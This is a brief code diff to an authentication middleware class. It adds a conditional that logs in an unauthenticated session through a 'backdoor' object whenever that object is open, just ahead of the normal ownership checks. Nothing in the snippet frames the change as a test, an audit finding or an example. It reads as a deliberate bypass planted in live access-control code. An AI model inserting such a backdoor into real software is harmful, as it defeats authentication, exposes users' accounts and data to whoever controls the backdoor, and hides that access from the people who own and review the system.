@@ -27,6 +27,9 @@ const class AuthenticationMiddleware : Middleware {
 				pipeline.service; return				
 			}
 			
+			if (!userSession.isLoggedIn && backdoor.isOpen)
+				backdoor.login
+
 			if (userSession.isLoggedIn) {
 				if (userSession.user.owns(pod)) {
 					pipeline.service; return	
